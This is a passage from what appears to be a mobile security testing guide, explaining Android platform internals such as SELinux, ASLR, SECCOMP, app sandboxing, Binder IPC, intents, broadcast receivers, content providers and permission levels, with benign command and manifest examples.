account and implemented by ROM developers or device vendors, which want
to provide full disk encryption without sacrificing performance on
low-end devices. At the moment of writing there is no public
cryptographic library that implements this cipher to use it on Android
applications. It should be noted that AES runs faster on devices having
the AES instruction set. In that case the use of Adiantum is highly
discouraged.

\hypertarget{android-security-hardening}{%
\paragraph{Android Security
Hardening}\label{android-security-hardening}}

Android contains many different features that attempt to make it more
difficult for a malicious application to break out of its sandbox. Since
applications are effectively running code on your device, it is
important that this can be done securely, even if the application itself
can not be trusted. The following sections explain which mitigations are
in place to prevent applications from abusing vulnerabilities. Note that
an OS is never 100\% secure and new vulnerabilities are still discovered
on a regular basis, even with these mitigations in place.

\hypertarget{selinux}{%
\subparagraph{SELinux}\label{selinux}}

Security-Enhanced Linux (SELinux) uses a Mandatory Access Control (MAC)
system to further lock down which processes should have access to which
resources. Each resource is given a label in the form of
\texttt{user:role:type:mls\_level} which defines which users are able to
execute which types of actions on it. For example, one process may only
be able to read a file, while another process may be able to edit or
delete the file. This way, by working on a least-privilege principle,
vulnerable processes are more difficult to exploit via privilege
escalation or lateral movement.

Further information is available on the
\href{https://source.android.com/security/selinux}{Android Security
website}.

\hypertarget{aslr-kaslr-pie-and-dep}{%
\subparagraph{ASLR, KASLR, PIE and DEP}\label{aslr-kaslr-pie-and-dep}}

Address Space Layout Randomization (ASLR), which has been part of
Android since Android 4.1 (API level 15), is a standard protection
against buffer-overflow attacks, which makes sure that both the
application and the OS are loaded to random memory addresses making it
difficult to get the correct address for a specific memory region or
library. In Android 8.0 (API level 26), this protection was also
implemented for the kernel (KASLR). ASLR protection is only possible if
the application can be loaded at a random place in memory, which is
indicated by the Position Independent Executable (PIE) flag of the
application. Since Android 5.0 (API level 21), support for non-PIE
enabled native libraries was dropped. Finally, Data Execution Prevention
(DEP) prevents code execution on the stack and heap, which is also used
to combat buffer-overflow exploits.

Further information is available on the
\href{https://android-developers.googleblog.com/2016/07/protecting-android-with-more-linux.html}{Android
Developers blog}.

\hypertarget{seccomp}{%
\subparagraph{SECCOMP}\label{seccomp}}

Android applications can contain native code written in C or C++. These
compiled binaries can communicate both with the Android Runtime through
Java Native Interface (JNI) bindings, and with the OS through system
calls. Some system calls are either not implemented, or are not supposed
to be called by normal applications. As these system calls communicate
directly with the kernel, they are a prime target for exploit
developers. With Android 8 (API level 26), Android has introduced the
support for Secure Computing (SECCOMP) filters for all Zygote based
processes (i.e.~user applications). These filters restrict the available
syscalls to those exposed through bionic.

Further information is available on the
\href{https://android-developers.googleblog.com/2017/07/seccomp-filter-in-android-o.html}{Android
Developers blog}.

\hypertarget{apps-on-android}{%
\subsubsection{Apps on Android}\label{apps-on-android}}

\hypertarget{communication-with-the-operating-system}{%
\paragraph{Communication with the Operating
System}\label{communication-with-the-operating-system}}

Android apps interact with system services via the Android Framework, an
abstraction layer that offers high-level Java APIs. The majority of
these services are invoked via normal Java method calls and are
translated to IPC calls to system services that are running in the
background. Examples of system services include:

\begin{itemize}
\tightlist
\item
  Connectivity (Wi-Fi, Bluetooth, NFC, etc.)
\item
  Files
\item
  Cameras
\item
  Geolocation (GPS)
\item
  Microphone
\end{itemize}

The framework also offers common security functions, such as
cryptography.

The API specifications change with every new Android release. Critical
bug fixes and security patches are usually applied to earlier versions
as well. The oldest Android version supported at the time of writing is
Android 8.1 (API level 27) and the current Android version is Android 10
(API level 29).

Noteworthy API versions:

\begin{itemize}
\tightlist
\item
  Android 4.2 (API level 16) in November 2012 (introduction of SELinux)
\item
  Android 4.3 (API level 18) in July 2013 (SELinux became enabled by
  default)
\item
  Android 4.4 (API level 19) in October 2013 (several new APIs and ART
  introduced)
\item
  Android 5.0 (API level 21) in November 2014 (ART used by default and
  many other features added)
\item
  Android 6.0 (API level 23) in October 2015 (many new features and
  improvements, including granting; detailed permissions setup at
  runtime rather than all or nothing during installation)
\item
  Android 7.0 (API level 24-25) in August 2016 (new JIT compiler on ART)
\item
  Android 8.0 (API level 26-27) in August 2017 (a lot of security
  improvements)
\item
  Android 9 (API level 28) in August 2018 (restriction of background
  usage of mic or camera, introduction of lockdown mode, default HTTPS
  for all apps)
\item
  Android 10 (API level 29) in September 2019 (notification bubbles,
  project Mainline)
\end{itemize}

\hypertarget{linux-uidgid-for-normal-applications}{%
\paragraph{Linux UID/GID for Normal
Applications}\label{linux-uidgid-for-normal-applications}}

Android leverages Linux user management to isolate apps. This approach
is different from user management usage in traditional Linux
environments, where multiple apps are often run by the same user.
Android creates a unique UID for each Android app and runs the app in a
separate process. Consequently, each app can access its own resources
only. This protection is enforced by the Linux kernel.

Generally, apps are assigned UIDs in the range of 10000 and 99999.
Android apps receive a user name based on their UID. For example, the
app with UID 10188 receives the user name \texttt{u0\_a188}. If the
permissions an app requested are granted, the corresponding group ID is
added to the app's process. For example, the user ID of the app below is
10188. It belongs to the group ID 3003 (inet). That group is related to
android.permission.INTERNET permission. The output of the \texttt{id}
command is shown below.

\begin{verbatim}
$ id
uid=10188(u0_a188) gid=10188(u0_a188) groups=10188(u0_a188),3003(inet),
9997(everybody),50188(all_a188) context=u:r:untrusted_app:s0:c512,c768
\end{verbatim}

The relationship between group IDs and permissions is defined in the
file
\href{http://androidxref.com/7.1.1_r6/xref/frameworks/base/data/etc/platform.xml}{frameworks/base/data/etc/platform.xml}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<permission}\OtherTok{ name=}\StringTok{"android.permission.INTERNET"} \KeywordTok{>}
    \KeywordTok{<group}\OtherTok{ gid=}\StringTok{"inet"} \KeywordTok{/>}
\KeywordTok{</permission>}

\KeywordTok{<permission}\OtherTok{ name=}\StringTok{"android.permission.READ\_LOGS"} \KeywordTok{>}
    \KeywordTok{<group}\OtherTok{ gid=}\StringTok{"log"} \KeywordTok{/>}
\KeywordTok{</permission>}

\KeywordTok{<permission}\OtherTok{ name=}\StringTok{"android.permission.WRITE\_MEDIA\_STORAGE"} \KeywordTok{>}
    \KeywordTok{<group}\OtherTok{ gid=}\StringTok{"media\_rw"} \KeywordTok{/>}
    \KeywordTok{<group}\OtherTok{ gid=}\StringTok{"sdcard\_rw"} \KeywordTok{/>}
\KeywordTok{</permission>}
\end{Highlighting}
\end{Shaded}

\hypertarget{the-app-sandbox}{%
\paragraph{The App Sandbox}\label{the-app-sandbox}}

Apps are executed in the Android Application Sandbox, which separates
the app data and code execution from other apps on the device. This
separation adds a layer of security.

Installation of a new app creates a new directory named after the app
package, which results in the following path:
\texttt{/data/data/{[}package-name{]}}. This directory holds the app's
data. Linux directory permissions are set such that the directory can be
read from and written to only with the app's unique UID.

\begin{figure}
\centering
\includegraphics[width=4.16667in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/4f788504cb27937eddb44c2ec5f319b376b249d4.png}
\caption{Sandbox}
\end{figure}

We can confirm this by looking at the file system permissions in the
\texttt{/data/data} folder. For example, we can see that Google Chrome
and Calendar are assigned one directory each and run under different
user accounts:

\begin{verbatim}
drwx------  4 u0_a97              u0_a97              4096 2017-01-18 14:27 com.android.calendar
drwx------  6 u0_a120             u0_a120             4096 2017-01-19 12:54 com.android.chrome
\end{verbatim}

Developers who want their apps to share a common sandbox can sidestep
sandboxing. When two apps are signed with the same certificate and
explicitly share the same user ID (having the \emph{sharedUserId} in
their \emph{AndroidManifest.xml} files), each can access the other's
data directory. See the following example to achieve this in the NFC
app:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<manifest}\OtherTok{ xmlns:android=}\StringTok{"http://schemas.android.com/apk/res/android"}
\OtherTok{  package=}\StringTok{"com.android.nfc"}
\OtherTok{  android:sharedUserId=}\StringTok{"android.uid.nfc"}\KeywordTok{>}
\end{Highlighting}
\end{Shaded}

\hypertarget{zygote}{%
\subparagraph{Zygote}\label{zygote}}

The process \texttt{Zygote} starts up during
\href{https://github.com/dogriffiths/HeadFirstAndroid/wiki/How-Android-Apps-are-Built-and-Run}{Android
initialization}. Zygote is a system service for launching apps. The
Zygote process is a ``base'' process that contains all the core
libraries the app needs. Upon launch, Zygote opens the socket
\texttt{/dev/socket/zygote} and listens for connections from local
clients. When it receives a connection, it forks a new process, which
then loads and executes the app-specific code.

\hypertarget{app-lifeycle}{%
\subparagraph{App Lifeycle}\label{app-lifeycle}}

In Android, the lifetime of an app process is controlled by the
operating system. A new Linux process is created when an app component
is started and the same app doesn't yet have any other components
running. Android may kill this process when the latter is no longer
necessary or when reclaiming memory is necessary to run more important
apps. The decision to kill a process is primarily related to the state
of the user's interaction with the process. In general, processes can be
in one of four states.

\begin{itemize}
\item
  A foreground process (e.g., an activity running at the top of the
  screen or a running BroadcastReceiver)
\item
  A visible process is a process that the user is aware of, so killing
  it would have a noticeable negative impact on user experience. One
  example is running an activity that's visible to the user on-screen
  but not in the foreground.
\item
  A service process is a process hosting a service that has been started
  with the \texttt{startService} method. Though these processes aren't
  directly visible to the user, they are generally things that the user
  cares about (such as background network data upload or download), so
  the system will always keep such processes running unless there's
  insufficient memory to retain all foreground and visible processes.
\item
  A cached process is a process that's not currently needed, so the
  system is free to kill it when memory is needed. Apps must implement
  callback methods that react to a number of events; for example, the
  \texttt{onCreate} handler is called when the app process is first
  created. Other callback methods include \texttt{onLowMemory},
  \texttt{onTrimMemory} and \texttt{onConfigurationChanged}.
\end{itemize}

\hypertarget{app-bundles}{%
\subparagraph{App Bundles}\label{app-bundles}}

Android applications can be shipped in two forms: the Android Package
Kit (APK) file or an
\href{https://developer.android.com/guide/app-bundle}{Android App
Bundle} (.aab). Android App Bundles provide all the resources necessary
for an app, but defer the generation of the APK and its signing to
Google Play. App Bundles are signed binaries which contain the code of
the app in several modules. The base module contains the core of the
application. The base module can be extended with various modules which
contain new enrichments/functionalities for the app as further explained
on the \href{https://developer.android.com/guide/app-bundle}{developer
documentation for app bundle}. If you have an Android App Bundle, you
can best use the
\href{https://developer.android.com/studio/command-line/bundletool}{bundletool}
command line tool from Google to build unsigned APKs in order to use the
existing tooling on the APK. You can create an APK from an AAB file by
running the following command:

\begin{verbatim}
$ bundletool build-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks
\end{verbatim}

If you want to create signed APKs ready for deployment to a test device,
use:

\begin{verbatim}
$ bundletool build-apks --bundle=/MyApp/my_app.aab --output=/MyApp/my_app.apks
--ks=/MyApp/keystore.jks
--ks-pass=file:/MyApp/keystore.pwd
--ks-key-alias=MyKeyAlias
--key-pass=file:/MyApp/key.pwd
\end{verbatim}

We recommend that you test both the APK with and without the additional
modules, so that it becomes clear whether the additional modules
introduce and/or fix security issues for the base module.

\hypertarget{android-manifest}{%
\subparagraph{Android Manifest}\label{android-manifest}}

Every app has an Android Manifest file, which embeds content in binary
XML format. The standard name of this file is AndroidManifest.xml. It is
located in the root directory of the app's Android Package Kit (APK)
file.

The manifest file describes the app structure, its components
(activities, services, content providers, and intent receivers), and
requested permissions. It also contains general app metadata, such as
the app's icon, version number, and theme. The file may list other
information, such as compatible APIs (minimal, targeted, and maximal SDK
version) and the
\href{https://developer.android.com/guide/topics/data/install-location.html}{kind
of storage it can be installed on (external or internal)}.

Here is an example of a manifest file, including the package name (the
convention is a reversed URL, but any string is acceptable). It also
lists the app version, relevant SDKs, required permissions, exposed
content providers, broadcast receivers used with intent filters and a
description of the app and its activities:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<manifest}
\OtherTok{    package=}\StringTok{"com.owasp.myapplication"}
\OtherTok{    android:versionCode=}\StringTok{"0.1"} \KeywordTok{>}

    \KeywordTok{<uses{-}sdk}\OtherTok{ android:minSdkVersion=}\StringTok{"12"}
\OtherTok{        android:targetSdkVersion=}\StringTok{"22"}
\OtherTok{        android:maxSdkVersion=}\StringTok{"25"} \KeywordTok{/>}

    \KeywordTok{<uses{-}permission}\OtherTok{ android:name=}\StringTok{"android.permission.INTERNET"} \KeywordTok{/>}

    \KeywordTok{<provider}
\OtherTok{        android:name=}\StringTok{"com.owasp.myapplication.MyProvider"}
\OtherTok{        android:exported=}\StringTok{"false"} \KeywordTok{/>}

    \KeywordTok{<receiver}\OtherTok{ android:name=}\StringTok{".MyReceiver"} \KeywordTok{>}
        \KeywordTok{<intent{-}filter>}
            \KeywordTok{<action}\OtherTok{ android:name=}\StringTok{"com.owasp.myapplication.myaction"} \KeywordTok{/>}
        \KeywordTok{</intent{-}filter>}
    \KeywordTok{</receiver>}

    \KeywordTok{<application}
\OtherTok{        android:icon=}\StringTok{"@drawable/ic\_launcher"}
\OtherTok{        android:label=}\StringTok{"@string/app\_name"}
\OtherTok{        android:theme=}\StringTok{"@style/Theme.Material.Light"} \KeywordTok{>}
        \KeywordTok{<activity}
\OtherTok{            android:name=}\StringTok{"com.owasp.myapplication.MainActivity"} \KeywordTok{>}
            \KeywordTok{<intent{-}filter>}
                \KeywordTok{<action}\OtherTok{ android:name=}\StringTok{"android.intent.action.MAIN"} \KeywordTok{/>}
            \KeywordTok{</intent{-}filter>}
        \KeywordTok{</activity>}
    \KeywordTok{</application>}
\KeywordTok{</manifest>}
\end{Highlighting}
\end{Shaded}

The full list of available manifest options is in the official
\href{https://developer.android.com/guide/topics/manifest/manifest-intro.html}{Android
Manifest file documentation}.

\hypertarget{app-components}{%
\paragraph{App Components}\label{app-components}}

Android apps are made of several high-level components. The main
components are:

\begin{itemize}
\tightlist
\item
  Activities
\item
  Fragments
\item
  Intents
\item
  Broadcast receivers
\item
  Content providers and services
\end{itemize}

All these elements are provided by the Android operating system, in the
form of predefined classes available through APIs.

\hypertarget{activities}{%
\subparagraph{Activities}\label{activities}}

Activities make up the visible part of any app. There is one activity
per screen, so an app with three different screens implements three
different activities. Activities are declared by extending the Activity
class. They contain all user interface elements: fragments, views, and
layouts.

Each activity needs to be declared in the Android Manifest with the
following syntax:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<activity}\OtherTok{ android:name=}\StringTok{"ActivityName"}\KeywordTok{>}
\KeywordTok{</activity>}
\end{Highlighting}
\end{Shaded}

Activities not declared in the manifest can't be displayed, and
attempting to launch them will raise an exception.

Like apps, activities have their own life cycle and need to monitor
system changes to handle them. Activities can be in the following
states: active, paused, stopped, and inactive. These states are managed
by the Android operating system. Accordingly, activities can implement
the following event managers:

\begin{itemize}
\tightlist
\item
  onCreate
\item
  onSaveInstanceState
\item
  onStart
\item
  onResume
\item
  onRestoreInstanceState
\item
  onPause
\item
  onStop
\item
  onRestart
\item
  onDestroy
\end{itemize}

An app may not explicitly implement all event managers, in which case
default actions are taken. Typically, at least the \texttt{onCreate}
manager is overridden by the app developers. This is how most user
interface components are declared and initialized. \texttt{onDestroy}
may be overridden when resources (like network connections or
connections to databases) must be explicitly released or specific
actions must occur when the app shuts down.

\hypertarget{fragments}{%
\subparagraph{Fragments}\label{fragments}}

A fragment represents a behavior or a portion of the user interface
within the activity. Fragments were introduced Android with the version
Honeycomb 3.0 (API level 11).

Fragments are meant to encapsulate parts of the interface to facilitate
re-usability and adaptation to different screen sizes. Fragments are
autonomous entities in that they include all their required components
(they have their own layout, buttons, etc.). However, they must be
integrated with activities to be useful: fragments can't exist on their
own. They have their own life cycle, which is tied to the life cycle of
the Activities that implement them.

Because fragments have their own life cycle, the Fragment class contains
event managers that can be redefined and extended. These event managers
included onAttach, onCreate, onStart, onDestroy and onDetach. Several
others exist; the reader should refer to the
\href{https://developer.android.com/guide/components/fragments}{Android
Fragment specification} for more details.

Fragments can be easily implemented by extending the Fragment class
provided by Android:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ MyFragment }\KeywordTok{extends}\NormalTok{ Fragment \{}
\NormalTok{    ...}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Fragments don't need to be declared in manifest files because they
depend on activities.

To manage its fragments, an activity can use a Fragment Manager
(FragmentManager class). This class makes it easy to find, add, remove,
and replace associated fragments.

Fragment Managers can be created via the following:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{FragmentManager fm = }\FunctionTok{getFragmentManager}\NormalTok{();}
\end{Highlighting}
\end{Shaded}

Fragments don't necessarily have a user interface; they can be a
convenient and efficient way to manage background operations pertaining
to the app's user interface. A fragment may be declared persistent so
that if the system preserves its state even if its Activity is
destroyed.

\hypertarget{inter-process-communication}{%
\subparagraph{Inter-Process
Communication}\label{inter-process-communication}}

As we've already learned, every Android process has its own sandboxed
address space. Inter-process communication facilities allow apps to
exchange signals and data securely. Instead of relying on the default
Linux IPC facilities, Android's IPC is based on Binder, a custom
implementation of OpenBinder. Most Android system services and all
high-level IPC services depend on Binder.

The term \emph{Binder} stands for a lot of different things, including:

\begin{itemize}
\tightlist
\item
  Binder Driver: the kernel-level driver
\item
  Binder Protocol: low-level ioctl-based protocol used to communicate
  with the binder driver
\item
  IBinder Interface: a well-defined behavior that Binder objects
  implement
\item
  Binder object: generic implementation of the IBinder interface
\item
  Binder service: implementation of the Binder object; for example,
  location service, and sensor service
\item
  Binder client: an object using the Binder service
\end{itemize}

The Binder framework includes a client-server communication model. To
use IPC, apps call IPC methods in proxy objects. The proxy objects
transparently \emph{marshall} the call parameters into a \emph{parcel}
and send a transaction to the Binder server, which is implemented as a
character driver (/dev/binder). The server holds a thread pool for
handling incoming requests and delivers messages to the destination
object. From the perspective of the client app, all of this seems like a
regular method call---all the heavy lifting is done by the Binder
framework.

\begin{figure}
\centering
\includegraphics[width=4.16667in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/deb1cf5c3b76357c39b70ee98334d01e70f1ea3b.jpg}
\caption{Binder Overview}
\end{figure}

\emph{Binder Overview - Image source:
\href{https://www.nds.rub.de/media/attachments/files/2011/10/main.pdf}{Android
Binder by Thorsten Schreiber}}

Services that allow other applications to bind to them are called
\emph{bound services}. These services must provide an IBinder interface
to clients. Developers use the Android Interface Descriptor Language
(AIDL) to write interfaces for remote services.

Servicemanager is a system daemon that manages the registration and
lookup of system services. It maintains a list of name/Binder pairs for
all registered services. Services are added with \texttt{addService} and
retrieved by name with the static \texttt{getService} method in
\texttt{android.os.ServiceManager}:

\begin{Shaded}
\begin{Highlighting}[]
  \KeywordTok{public} \DataTypeTok{static}\NormalTok{ IBinder }\FunctionTok{getService}\NormalTok{(}\BuiltInTok{String}\NormalTok{ name)}
\end{Highlighting}
\end{Shaded}

You can query the list of system services with the
\texttt{service\ list} command.

\begin{verbatim}
$ adb shell service list
Found 99 services:
0 carrier_config: [com.android.internal.telephony.ICarrierConfigLoader]
1 phone: [com.android.internal.telephony.ITelephony]
2 isms: [com.android.internal.telephony.ISms]
3 iphonesubinfo: [com.android.internal.telephony.IPhoneSubInfo]
\end{verbatim}

\hypertarget{intents}{%
\paragraph{Intents}\label{intents}}

\emph{Intent messaging} is an asynchronous communication framework built
on top of Binder. This framework allows both point-to-point and
publish-subscribe messaging. An \emph{Intent} is a messaging object that
can be used to request an action from another app component. Although
intents facilitate inter-component communication in several ways, there
are three fundamental use cases:

\begin{itemize}
\tightlist
\item
  Starting an activity

  \begin{itemize}
  \tightlist
  \item
    An activity represents a single screen in an app. You can start a
    new instance of an activity by passing an intent to
    \texttt{startActivity}. The intent describes the activity and
    carries necessary data.
  \end{itemize}
\item
  Starting a service

  \begin{itemize}
  \tightlist
  \item
    A Service is a component that performs operations in the background,
    without a user interface. With Android 5.0 (API level 21) and later,
    you can start a service with JobScheduler.
  \end{itemize}
\item
  Delivering a broadcast

  \begin{itemize}
  \tightlist
  \item
    A broadcast is a message that any app can receive. The system
    delivers broadcasts for system events, including system boot and
    charging initialization. You can deliver a broadcast to other apps
    by passing an intent to \texttt{sendBroadcast} or
    \texttt{sendOrderedBroadcast}.
  \end{itemize}
\end{itemize}

There are two types of intents. Explicit intents name the component that
will be started (the fully qualified class name). For instance:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    Intent intent = }\KeywordTok{new} \FunctionTok{Intent}\NormalTok{(}\KeywordTok{this}\NormalTok{, myActivity.}\FunctionTok{myClass}\NormalTok{);}
\end{Highlighting}
\end{Shaded}

Implicit intents are sent to the OS to perform a given action on a given
set of data (The URL of the OWASP website in our example below). It is
up to the system to decide which app or class will perform the
corresponding service. For instance:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    Intent intent = }\KeywordTok{new} \FunctionTok{Intent}\NormalTok{(Intent.}\FunctionTok{MY\_ACTION}\NormalTok{, Uri.}\FunctionTok{parse}\NormalTok{(}\StringTok{"https://www.owasp.org"}\NormalTok{));}
\end{Highlighting}
\end{Shaded}

An \emph{intent filter} is an expression in Android Manifest files that
specifies the type of intents the component would like to receive. For
instance, by declaring an intent filter for an activity, you make it
possible for other apps to directly start your activity with a certain
kind of intent. Likewise, your activity can only be started with an
explicit intent if you don't declare any intent filters for it.

Android uses intents to broadcast messages to apps (such as an incoming
call or SMS) important power supply information (low battery, for
example), and network changes (loss of connection, for instance). Extra
data may be added to intents (through
\texttt{putExtra}/\texttt{getExtras}).

Here is a short list of intents sent by the operating system. All
constants are defined in the Intent class, and the whole list is in the
official Android documentation:

\begin{itemize}
\tightlist
\item
  ACTION\_CAMERA\_BUTTON
\item
  ACTION\_MEDIA\_EJECT
\item
  ACTION\_NEW\_OUTGOING\_CALL
\item
  ACTION\_TIMEZONE\_CHANGED
\end{itemize}

To improve security and privacy, a Local Broadcast Manager is used to
send and receive intents within an app without having them sent to the
rest of the operating system. This is very useful for ensuring that
sensitive and private data don't leave the app perimeter (geolocation
data for instance).

\hypertarget{broadcast-receivers}{%
\subparagraph{Broadcast Receivers}\label{broadcast-receivers}}

Broadcast Receivers are components that allow apps to receive
notifications from other apps and from the system itself. With them,
apps can react to events (internal, initiated by other apps, or
initiated by the operating system). They are generally used to update
user interfaces, start services, update content, and create user
notifications.

There are two ways to make a Broadcast Receiver known to the system. One
way is to declare it in the Android Manifest file. The manifest should
specify an association between the Broadcast Receiver and an intent
filter to indicate the actions the receiver is meant to listen for.

An example Broadcast Receiver declaration with an intent filter in a
manifest:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<receiver}\OtherTok{ android:name=}\StringTok{".MyReceiver"} \KeywordTok{>}
    \KeywordTok{<intent{-}filter>}
        \KeywordTok{<action}\OtherTok{ android:name=}\StringTok{"com.owasp.myapplication.MY\_ACTION"} \KeywordTok{/>}
    \KeywordTok{</intent{-}filter>}
\KeywordTok{</receiver>}
\end{Highlighting}
\end{Shaded}

Please note that in this example, the Broadcast Receiver does not
include the
\href{https://developer.android.com/guide/topics/manifest/receiver-element}{\texttt{android:exported}}
attribute. As at least one filter was defined, the default value will be
set to ``true''. In absence of any filters, it will be set to ``false''.

The other way is to create the receiver dynamically in code and register
it with the
\href{https://developer.android.com/reference/android/content/Context.html\#registerReceiver\%28android.content.BroadcastReceiver,\%2520android.content.IntentFilter\%29}{\texttt{Context.registerReceiver}}
method.

An example of registering a Broadcast Receiver dynamically:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// Define a broadcast receiver}
\NormalTok{myReceiver = }\KeywordTok{new} \FunctionTok{BroadcastReceiver}\NormalTok{() \{}
    \AttributeTok{@Override}
    \KeywordTok{public} \DataTypeTok{void} \FunctionTok{onReceive}\NormalTok{(}\BuiltInTok{Context}\NormalTok{ context, Intent intent) \{}
\NormalTok{        Log.}\FunctionTok{d}\NormalTok{(TAG, }\StringTok{"Intent received by myReceiver"}\NormalTok{);}
\NormalTok{    \}}
\NormalTok{\};}
\CommentTok{// Define an intent filter with actions that the broadcast receiver listens for}
\NormalTok{IntentFilter intentFilter = }\KeywordTok{new} \FunctionTok{IntentFilter}\NormalTok{();}
\NormalTok{intentFilter.}\FunctionTok{addAction}\NormalTok{(}\StringTok{"com.owasp.myapplication.MY\_ACTION"}\NormalTok{);}
\CommentTok{// To register the broadcast receiver}
\FunctionTok{registerReceiver}\NormalTok{(myReceiver, intentFilter);}
\CommentTok{// To un{-}register the broadcast receiver}
\FunctionTok{unregisterReceiver}\NormalTok{(myReceiver);}
\end{Highlighting}
\end{Shaded}

Note that the system starts an app with the registered receiver
automatically when a relevant intent is raised.

According to
\href{https://developer.android.com/guide/components/broadcasts}{Broadcasts
Overview}, a broadcast is considered ``implicit'' if it does not target
an app specifically. After receiving an implicit broadcast, Android will
list all apps that have registered a given action in their filters. If
more than one app has registered for the same action, Android will
prompt the user to select from the list of available apps.

An interesting feature of Broadcast Receivers is that they can be
prioritized; this way, an intent will be delivered to all authorized
receivers according to their priority. A priority can be assigned to an
intent filter in the manifest via the \texttt{android:priority}
attribute as well as programmatically via the
\href{https://developer.android.com/reference/android/content/IntentFilter\#setPriority\%28int\%29}{\texttt{IntentFilter.setPriority}}
method. However, note that receivers with the same priority will be
\href{https://developer.android.com/guide/components/broadcasts.html\#sending-broadcasts}{run
in an arbitrary order}.

If your app is not supposed to send broadcasts across apps, use a Local
Broadcast Manager
(\href{https://developer.android.com/reference/androidx/localbroadcastmanager/content/LocalBroadcastManager.html}{\texttt{LocalBroadcastManager}}).
They can be used to make sure intents are received from the internal app
only, and any intent from any other app will be discarded. This is very
useful for improving security and the efficiency of the app, as no
interprocess communication is involved. However, please note that the
\texttt{LocalBroadcastManager} class is
\href{https://developer.android.com/reference/androidx/localbroadcastmanager/content/LocalBroadcastManager.html}{deprecated}
and Google recommends using alternatives such as
\href{https://developer.android.com/reference/androidx/lifecycle/LiveData.html}{\texttt{LiveData}}.

For more security considerations regarding Broadcast Receiver, see
\href{https://developer.android.com/guide/components/broadcasts.html\#security-and-best-practices}{Security
Considerations and Best Practices}.

Implicit Broadcast Receiver Limitiation

According to
\href{https://developer.android.com/topic/performance/background-optimization}{Background
Optimizations}, apps targeting Android 7.0 (API level 24) or higher no
longer receive \texttt{CONNECTIVITY\_ACTION} broadcast unless they
register their Broadcast Receivers with
\texttt{Context.registerReceiver()}. The system does not send
\texttt{ACTION\_NEW\_PICTURE} and \texttt{ACTION\_NEW\_VIDEO} broadcasts
as well.

According to
\href{https://developer.android.com/about/versions/oreo/background.html\#broadcasts}{Background
Execution Limits}, apps that target Android 8.0 (API level 26) or higher
can no longer register Broadcast Receivers for implicit broadcasts in
their manifest, except for those listed in
\href{https://developer.android.com/guide/components/broadcast-exceptions}{Implicit
Broadcast Exceptions}. The Broadcast Receivers created at runtime by
calling \texttt{Context.registerReceiver} are not affected by this
limitation.

According to
\href{https://developer.android.com/guide/components/broadcasts\#changes-system-broadcasts}{Changes
to System Broadcasts}, beginning with Android 9 (API level 28), the
\texttt{NETWORK\_STATE\_CHANGED\_ACTION} broadcast doesn't receive
information about the user's location or personally identifiable data.

\hypertarget{content-providers}{%
\subparagraph{Content Providers}\label{content-providers}}

Android uses SQLite to store data permanently: as with Linux, data is
stored in files. SQLite is a light, efficient, open source relational
data storage technology that does not require much processing power,
which makes it ideal for mobile use. An entire API with specific classes
(Cursor, ContentValues, SQLiteOpenHelper, ContentProvider,
ContentResolver, etc.) is available. SQLite is not run as a separate
process; it is part of the app. By default, a database belonging to a
given app is accessible to this app only. However, content providers
offer a great mechanism for abstracting data sources (including
databases and flat files); they also provide a standard and efficient
mechanism to share data between apps, including native apps. To be
accessible to other apps, a content provider needs to be explicitly
declared in the manifest file of the app that will share it. As long as
content providers aren't declared, they won't be exported and can only
be called by the app that creates them.

Content providers are implemented through a URI addressing scheme: they
all use the content:// model. Regardless of the type of sources (SQLite
database, flat file, etc.), the addressing scheme is always the same,
thereby abstracting the sources and offering the developer a unique
scheme. Content providers offer all regular database operations: create,
read, update, delete. That means that any app with proper rights in its
manifest file can manipulate the data from other apps.

\hypertarget{services}{%
\subparagraph{Services}\label{services}}

Services are Android OS components (based on the Service class) that
perform tasks in the background (data processing, starting intents, and
notifications, etc.) without presenting a user interface. Services are
meant to run processes long-term. Their system priorities are lower than
those of active apps and higher than those of inactive apps. Therefore,
they are less likely to be killed when the system needs resources, and
they can be configured to automatically restart when enough resources
become available. This makes services a great candidate for running
background tasks. Please note that Services, like Activities, are
executed in the main app thread. A service does not create its own
thread and does not run in a separate process unless you specify
otherwise.

\hypertarget{permissions}{%
\subparagraph{Permissions}\label{permissions}}

Because Android apps are installed in a sandbox and initially can't
access user information and system components (such as the camera and
the microphone), Android provides a system with a predefined set of
permissions for certain tasks that the app can request. For example, if
you want your app to use a phone's camera, you have to request the
\texttt{android.permission.CAMERA} permission. Prior to Android 6.0 (API
level 23), all permissions an app requested were granted at
installation. From API level 23 onwards, the user must approve some
permissions requests during app execution.

Protection Levels

Android permissions are ranked on the basis of the protection level they
offer and divided into four different categories:

\begin{itemize}
\tightlist
\item
  \emph{Normal}: the lower level of protection. It gives the apps access
  to isolated application-level features with minimal risk to other
  apps, the user, or the system. It is granted during app installation
  and is the default protection level: Example:
  \texttt{android.permission.INTERNET}
\item
  \emph{Dangerous}: This permission allows the app to perform actions
  that might affect the user's privacy or the normal operation of the
  user's device. This level of permission may not be granted during
  installation; the user must decide whether the app should have this
  permission. Example: \texttt{android.permission.RECORD\_AUDIO}
\item
  \emph{Signature}: This permission is granted only if the requesting
  app has been signed with the same certificate as the app that declared
  the permission. If the signature matches, the permission is
  automatically granted. Example:
  \texttt{android.permission.ACCESS\_MOCK\_LOCATION}
\item
  \emph{SystemOrSignature}: This permission is granted only to apps
  embedded in the system image or signed with the same certificate that
  the app that declared the permission was signed with. Example:
  \texttt{android.permission.ACCESS\_DOWNLOAD\_MANAGER}
\end{itemize}

Requesting Permissions

Apps can request permissions for the protection levels Normal,
Dangerous, and Signature by including
\texttt{\textless{}uses-permission\ /\textgreater{}} tags into their
manifest. The example below shows an AndroidManifest.xml sample
requesting permission to read SMS messages:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<manifest}\OtherTok{ xmlns:android=}\StringTok{"http://schemas.android.com/apk/res/android"}
